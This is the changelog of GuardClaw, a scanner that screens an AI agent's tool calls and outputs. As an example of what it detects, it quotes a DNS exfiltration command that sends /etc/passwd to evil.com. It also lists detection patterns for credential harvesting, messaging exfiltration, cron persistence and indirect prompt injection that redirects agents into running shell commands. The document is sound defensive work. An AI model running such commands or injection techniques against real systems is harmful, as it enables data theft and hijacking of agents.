# Changelog

All notable changes to GuardClaw are documented here.

---

## [4.3.0] — 2026-02-17

### New: Agent-Specific Attack Detection

- **[NEW] DNS exfiltration patterns** — Detects data exfiltration via DNS subdomain
  lookups (`nslookup $(cat /etc/passwd | base64).evil.com`), which bypass HTTP-based
  egress monitoring. Covers `nslookup`, `dig`, `host`, and dynamic subdomain generation.

- **[NEW] Tool chaining / indirect prompt injection patterns** — Detects fetch→execute
  sequences where external content (web page, email, file) attempts to silently redirect
  the agent into running shell commands.

- **[NEW] Messaging exfiltration patterns** — Detects code that reads environment
  variables, contacts, or file contents and forwards them via WhatsApp, Telegram,
  Slack, Discord, or email. Targets the OpenClaw messaging surface specifically.

- **[NEW] OpenClaw credential harvesting patterns** — Detects attempts to read
  `~/.openclaw/` config files, session tokens, API keys (ANTHROPIC_API_KEY,
  OPENAI_API_KEY, OPENCLAW_TOKEN). Addresses the known risk of plaintext credential
  storage in the OpenClaw workspace.

- **[NEW] Agentic loop hijacking patterns** — Detects infinite loops with network
  actions, timed schedulers, and cron-based persistence mechanisms injected into
  agent tool results.

### New: Library API improvements

- **[NEW] `ProtectorResult.action`** — `Protector.scan()` now returns a ready-made
  `Action.ALLOW / CONFIRM / BLOCK` decision. Callers no longer need to re-implement
  threat policy. Also adds `.is_blocked`, `.needs_confirmation`, and `.mode` fields.

- **[NEW] `Protector.guarded_tool_call()`** — Moved from a free module-level function
  into the `Protector` class as a `@staticmethod`. Importable as
  `Protector.guarded_tool_call(...)`. The old module-level alias has been removed.

- **[NEW] `query_ollama_async()`** — Async counterpart to `query_ollama()` using
  `httpx.AsyncClient`. For asyncio-based agent integrations (OpenClaw gateway,
  FastAPI middleware, etc.). Requires `pip install httpx`.

### Bug Fixes (from 4.2.1)

- **[FIX] Confirm button now resumes the AI scan** — `_confirm_allow()` was a dead end
  (showed "Confirmado" but never continued the analysis). Now uses `_confirmed_override`
  flag to bypass the static gate exactly once and re-invoke `_start_scan()`.

- **[FIX] `post_model()` and `post_tool()` run the full StaticScanner** — Previously
  only `OutputScrubber` ran on egress. Model output and tool results containing RCE,
  shell injection, or any CODE_PATTERNS threat are now detected and redacted.

- **[FIX] `_decision_for()` now uses `EventType`** — Tool calls (`TOOL_CALL`,
  `TOOL_RESULT`) receive stricter policy than model I/O because they have irreversible
  real-world side effects. In Bouncer mode: `alto` on a tool call is now BLOCK.
  In Nanny mode: `medio` on a tool call is now BLOCK.

- **[FIX] `RULES.json` severity validation** — Invalid severity values are rejected
  with a clear error message instead of silently corrupting risk assessment.

- **[FIX] Sentinel + ClipboardMonitor deduplication** — Both components polled the
  clipboard independently and could generate two scans for the same paste. Fixed
  with a shared content hash.

- **[FIX] `OutputScrubber` alert fatigue in JUNIOR mode** — External URLs are no
  longer flagged as `medium` in JUNIOR mode (where the model legitimately cites
  technical references). URLs with query params remain `high` in all modes.

### New: Installation & Integration

- **[NEW] `install.sh`** — One-command installer for macOS/Linux. Checks Python,
  installs dependencies, installs Ollama if needed, pulls the default model, and
  automatically copies the GuardClaw skill to `~/.openclaw/workspace/skills/` if
  OpenClaw is detected.

- **[NEW] `install.bat`** — Equivalent one-command installer for Windows.

- **[NEW] `requirements.txt`** — Clean pip requirements file.

- **[NEW] `SKILL.md`** — OpenClaw skill definition. Drop into
  `~/.openclaw/workspace/skills/guardclaw/` to give your OpenClaw agent automatic
  pre/post tool scanning. Includes threat model documentation and usage examples.

---

## [4.1.0] — 2026-02-17

### Security Fixes

- **[FIX] ReDoS protection** — Input is capped at 512 KB before static scan. The base64 regex is additionally capped at 100 KB to prevent catastrophic backtracking on adversarially crafted input.

- **[FIX] Base64 recursion depth limit** — Recursive base64 decode is now limited to 3 levels deep (`MAX_RECURSION_DEPTH = 3`). Previously, a `base64(base64(base64(...)))` nested payload could cause a stack overflow or sustained CPU exhaustion.

- **[FIX] Path traversal in CLI mode** — `--scan` now resolves and validates the path via `os.path.realpath()`. Paths outside the current working directory trigger a visible warning. Symlink attacks and `../../etc/shadow`-style traversals are now flagged.

- **[FIX] Allowlist subdomain spoofing** — The domain allowlist previously used a naive substring match, allowing `github.com.evil.tk` to pass as trusted. Now uses `urllib.parse.urlparse()` to extract the real hostname and validates against it properly.

- **[FIX] Thread-safe ClipboardMonitor** — `_last_wallets` is now protected by a `threading.Lock()`. Previously, concurrent reads/writes from the monitor thread and the main thread could cause a race condition and incorrect poisoning detection.

- **[FIX] Sensitive data never stored in history** — When the scanner detects sensitive data (passwords, API keys, wallet addresses), `code_snippet` in the history log is now stored as an empty string. Previously, up to 200 characters of the scanned content were always stored in plaintext.

- **[FIX] AI scan debounce** — `_start_scan` now checks if a scan is already in progress before launching a new one. Prevents request flooding when Sentinel auto-scan is active.

### Other Improvements

- Fixed file handle leak in `OnboardingWindow._close` (now uses context manager)
- CLI help text updated to reference `guardclaw.py` (was `guardclaw_4.py`)
- Added `SECURITY.md`, `CONTRIBUTING.md`, `LICENSE`, `.gitignore`

---

## [4.0.0] — 2026-01-xx

### New Features

- **Prompt Sandbox** — user content is isolated from system prompt using role separation. The first real defense against prompt injection reaching the AI model.
- **CryptoGuard** — detects wallet addresses for BTC (Legacy + Bech32), ETH/EVM, SOL, XMR, LTC, DOGE, ADA, TRX, XRP
- **Clipboard Monitor** — background thread watches for clipboard poisoning (wallet replacement attack)
- **Unicode guard** — homoglyph and invisible character detection
- **Domain allowlist** — reduces false positives for common trusted domains
- **CLI mode** — `--scan`, `--text`, `--model`, `--mode`, `--output` flags for pipeline/CI use
- **Three modes** — Nanny (full block), Bouncer (smart), Junior (technical detail)
- **History with sensitive data flag** — scan log with sha256 hash, no full content stored

---

## [3.x and earlier]

Pre-open-source versions. Not publicly documented.
